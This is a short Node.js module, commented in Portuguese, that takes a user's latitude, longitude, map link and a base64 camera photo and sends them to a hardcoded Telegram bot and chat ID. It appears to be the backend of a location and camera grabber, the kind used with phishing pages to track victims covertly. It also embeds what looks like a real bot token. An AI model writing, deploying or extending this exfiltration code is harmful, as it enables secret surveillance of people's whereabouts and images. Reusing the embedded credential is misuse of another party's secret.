const http = require("http");
const https = require("https");
const axios = require("axios");
const FormData = require("form-data");

// Token e chat_id fixos do seu bot Telegram
const TELEGRAM_BOT_TOKEN = "7674928346:AAEd6FNCSB_ozfmqs7islmmEaH6x8bWivVQ";
const TELEGRAM_CHAT_ID = "1276935257";

async function enviarDados(latitude, longitude, maps, photo, res) {
  try {
    // Força IPv4 criando agentes http e https com family 4
    const httpAgent = new http.Agent({ family: 4 });
    const httpsAgent = new https.Agent({ family: 4 });

    // Envia mensagem de localização via GET com query string na URL
    const message = encodeURIComponent(`📍 Localização do usuário:\nLatitude: ${latitude}\nLongitude: ${longitude}\n${maps}`);
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${message}`;

    await axios.get(url, { httpAgent, httpsAgent });

    if (photo) {
      // Remove o prefixo da base64
      const base64Data = photo.replace(/^data:image\/\w+;base64,/, "");
      const buffer = Buffer.from(base64Data, "base64");

      const form = new FormData();
      form.append("chat_id", TELEGRAM_CHAT_ID);
      form.append("photo", buffer, {
        filename: "photo.png",
        contentType: "image/png",
      });

      // Envia foto com os headers corretos e agentes IPv4
      await axios.post(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
        form,
        {
          headers: form.getHeaders(),
          httpAgent,
          httpsAgent,
        }
      );
    }

    res.json({ success: true });
  } catch (error) {
    console.error("Erro ao enviar para Telegram:", error.response?.data || error.message || error);
    res.status(500).json({ success: false, message: "Erro ao enviar os dados." });
  }
}

module.exports = { enviarDados };

